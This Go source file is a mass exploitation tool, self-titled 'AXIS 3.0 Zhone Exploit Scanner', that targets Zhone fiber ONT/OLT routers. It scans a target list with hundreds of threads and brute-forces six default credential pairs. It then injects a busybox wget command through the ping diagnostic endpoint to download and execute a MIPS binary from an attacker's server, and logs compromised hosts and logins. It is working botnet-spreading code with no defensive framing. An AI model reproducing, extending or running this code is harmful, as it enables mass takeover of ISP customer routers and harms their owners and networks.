package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

/* ============================================================================
 * ZHONE EXPLOIT SCANNER - FTTH/ONT Router Compromise (Improved)
 * ============================================================================
 * Exploits Zhone ONT/OLT fiber routers via ping diagnostic command injection
 * Targets: Zhone equipment with session key authentication
 * Method: GET /zhnping.cmd with session key + command injection in ipAddr parameter
 * Credentials: 6 username/password combinations
 * Payload: Busybox wget to download and execute binary
 * Global coverage: FTTH ISPs with Zhone deployments worldwide
 * ============================================================================ */

// Zhone credentials - matches Python version
var zhoneCredentials = []string{
	"admin:admin",
	"admin:cciadmin",
	"Admin:Admin",
	"user:user",
	"admin:zhone",
	"vodafone:vodafone",
}

// Server IP for payload
var serverIP string

type ZhoneResult struct {
	IP       string
	Port     string
	Username string
	Password string
	Success  bool
}

type ZhoneStats struct {
	Total   int64
	Found   int64
	Logins  int64
	Vuln    int64
}

var stats ZhoneStats

func checkDevice(target string, timeout time.Duration) bool {
	host, port, err := parseTarget(target)
	if err != nil {
		return false
	}

	conn, err := net.DialTimeout("tcp", host+":"+port, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Send HTTP request to check for 401 Unauthorized
	payload := fmt.Sprintf(
		"GET / HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"+
			"Accept-Language: en-GB,en;q=0.5\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Connection: close\r\n"+
			"Upgrade-Insecure-Requests: 1\r\n\r\n",
		target)

	conn.SetWriteDeadline(time.Now().Add(timeout))
	conn.Write([]byte(payload))

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	if err != nil {
		return false
	}

	response := string(buf[:n])
	if strings.Contains(response, "401 Unauthorized") && strings.Contains(response, "Basic realm=") {
		return true
	}

	return false
}

func tryLogin(target string, timeout time.Duration) (bool, string, string, string) {
	host, port, err := parseTarget(target)
	if err != nil {
		return false, "", "", ""
	}

	for i, cred := range zhoneCredentials {
		parts := strings.SplitN(cred, ":", 2)
		if len(parts) != 2 {
			continue
		}
		username, password := parts[0], parts[1]

		conn, err := net.DialTimeout("tcp", host+":"+port, timeout)
		if err != nil {
			continue
		}

		authBase64 := base64.StdEncoding.EncodeToString([]byte(cred))
		payload := fmt.Sprintf(
			"GET /zhnping.html HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\n"+
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"+
				"Accept-Language: en-GB,en;q=0.5\r\n"+
				"Accept-Encoding: gzip, deflate\r\n"+
				"Connection: close\r\n"+
				"Upgrade-Insecure-Requests: 1\r\n"+
				"Referer: http://%s/menu.html\r\n"+
				"Authorization: Basic %s\r\n\r\n",
			target, target, authBase64)

		conn.SetWriteDeadline(time.Now().Add(timeout))
		conn.Write([]byte(payload))

		conn.SetReadDeadline(time.Now().Add(timeout))
		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		conn.Close()

		if err != nil {
			continue
		}

		response := string(buf[:n])
		if strings.Contains(response, "HTTP/1.1 200") || strings.Contains(response, "HTTP/1.0 200") {
			// Extract session key
			sessionKey := extractSessionKey(response)
			if sessionKey != "" {
				return true, username, password, sessionKey
			}
			// Login successful but no session key found, use index as fallback
			return true, username, password, fmt.Sprintf("session%d", i)
		}
	}

	return false, "", "", ""
}

func extractSessionKey(response string) string {
	// Look for: var sessionKey='VALUE';
	startIdx := strings.Index(response, "var sessionKey='")
	if startIdx == -1 {
		return ""
	}
	startIdx += len("var sessionKey='")

	endIdx := strings.Index(response[startIdx:], "';")
	if endIdx == -1 {
		return ""
	}

	return response[startIdx : startIdx+endIdx]
}

func sendExploit(target, username, password, sessionKey string, timeout time.Duration) bool {
	host, port, err := parseTarget(target)
	if err != nil {
		return false
	}

	authBase64 := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))
	
	// Payload - URL encoded busybox command
	// /bin/busybox wget <PAYLOAD> -O /var/g; chmod 777 /var/g; /var/g zhone
	payloadEncoded := fmt.Sprintf("/bin/busybox%%20wget%%20http://%s/bins/axis.mips%%20-O%%20/var/g;%%20chmod%%20777%%20/var/g;%%20/var/g%%20zhone", serverIP)

	conn, err := net.DialTimeout("tcp", host+":"+port, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Command injection via ipAddr parameter in /zhnping.cmd
	exploitPayload := fmt.Sprintf(
		"GET /zhnping.cmd?&test=ping&sessionKey=%s&ipAddr=1.1.1.1;%s&count=4&length=64 HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: Mozilla/5.0 (Intel Mac OS X 10.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Edg/81.0.416.72\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"+
			"Accept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Referer: http://%s/diag.html\r\n"+
			"Authorization: Basic %s\r\n"+
			"Connection: close\r\n"+
			"Upgrade-Insecure-Requests: 1\r\n\r\n",
		sessionKey, payloadEncoded, target, target, authBase64)

	conn.SetWriteDeadline(time.Now().Add(timeout))
	conn.Write([]byte(exploitPayload))

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 2048)
	n, err := conn.Read(buf)
	if err != nil {
		return false
	}

	response := string(buf[:n])
	// Check for ping log response indicating successful exploitation
	if strings.Contains(response, "/var/pinglog") ||
		strings.Contains(response, "200 OK") ||
		strings.Contains(response, "HTTP/1") {
		return true
	}

	return false
}

func processTarget(target string, wg *sync.WaitGroup, results chan<- ZhoneResult, sem chan struct{}) {
	defer wg.Done()

	sem <- struct{}{}
	defer func() { <-sem }()

	atomic.AddInt64(&stats.Total, 1)

	// Check if device is vulnerable (returns 401)
	if !checkDevice(target, 30*time.Second) {
		return
	}

	atomic.AddInt64(&stats.Found, 1)

	// Try login and get session key
	success, username, password, sessionKey := tryLogin(target, 30*time.Second)
	if !success || sessionKey == "" {
		return
	}

	atomic.AddInt64(&stats.Logins, 1)

	// Send exploit
	exploitSuccess := sendExploit(target, username, password, sessionKey, 30*time.Second)
	if exploitSuccess {
		atomic.AddInt64(&stats.Vuln, 1)
		
		results <- ZhoneResult{
			IP:       target,
			Port:     "80",
			Username: username,
			Password: password,
			Success:  true,
		}
	}
}

func parseTarget(target string) (host, port string, err error) {
	if strings.Contains(target, ":") {
		parts := strings.SplitN(target, ":", 2)
		return parts[0], parts[1], nil
	}
	return target, "80", nil
}

func loadTargets(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		targets = append(targets, line)
	}

	return targets, scanner.Err()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./zhone <target-list.txt> <server-ip> [threads]")
		fmt.Println("Example: ./zhone targets.txt 1.2.3.4 500")
		fmt.Println("")
		fmt.Println("Target format:")
		fmt.Println("  - IP addresses: 192.168.1.1")
		fmt.Println("  - IP:Port: 192.168.1.1:80")
		fmt.Println("")
		fmt.Println("Exploits Zhone ONT/OLT fiber routers via ping diagnostic command injection")
		fmt.Println("Payload: /bin/busybox wget http://<server>/bins/axis.mips -O /var/g; chmod 777; execute")
		os.Exit(1)
	}

	targetFile := os.Args[1]
	serverIP = os.Args[2]
	threads := 500
	if len(os.Args) > 3 {
		threads, _ = strconv.Atoi(os.Args[3])
	}

	fmt.Printf("[*] AXIS 3.0 Zhone Exploit Scanner (Improved)\n")
	fmt.Printf("[*] Loading targets from: %s\n", targetFile)
	fmt.Printf("[*] Payload server: %s\n", serverIP)
	fmt.Printf("[*] Using %d concurrent threads\n", threads)

	targets, err := loadTargets(targetFile)
	if err != nil {
		fmt.Printf("[-] Error loading targets: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Loaded %d targets\n", len(targets))
	fmt.Printf("[*] Starting exploitation...\n\n")

	var wg sync.WaitGroup
	results := make(chan ZhoneResult, 100)
	sem := make(chan struct{}, threads)

	// Start result writer
	go func() {
		f, _ := os.OpenFile("zhone_results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer f.Close()

		for result := range results {
			if result.Success {
				line := fmt.Sprintf("%s:%s | %s:%s\n", result.IP, result.Port, result.Username, result.Password)
				f.WriteString(line)
				fmt.Printf("[+] ZHONE EXPLOITED: %s:%s | Login: %s:%s\n", result.IP, result.Port, result.Username, result.Password)
			}
		}
	}()

	// Start status printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		i := 0
		for range ticker.C {
			fmt.Printf("[%d's] Total: %d | Found: %d | Logins: %d | Vuln: %d          \r",
				i, 
				atomic.LoadInt64(&stats.Total), 
				atomic.LoadInt64(&stats.Found), 
				atomic.LoadInt64(&stats.Logins),
				atomic.LoadInt64(&stats.Vuln))
		}
	}()

	startTime := time.Now()

	for _, target := range targets {
		wg.Add(1)
		go processTarget(target, &wg, results, sem)
	}

	wg.Wait()
	close(results)

	elapsed := time.Since(startTime)
	fmt.Printf("\n\n[*] Zhone exploitation completed in %s\n", elapsed)
	fmt.Printf("[*] Results saved to: zhone_results.txt\n")
	fmt.Printf("[*] Total: %d | Found: %d | Logins: %d | Vuln: %d\n",
		atomic.LoadInt64(&stats.Total),
		atomic.LoadInt64(&stats.Found),
		atomic.LoadInt64(&stats.Logins),
		atomic.LoadInt64(&stats.Vuln))
}
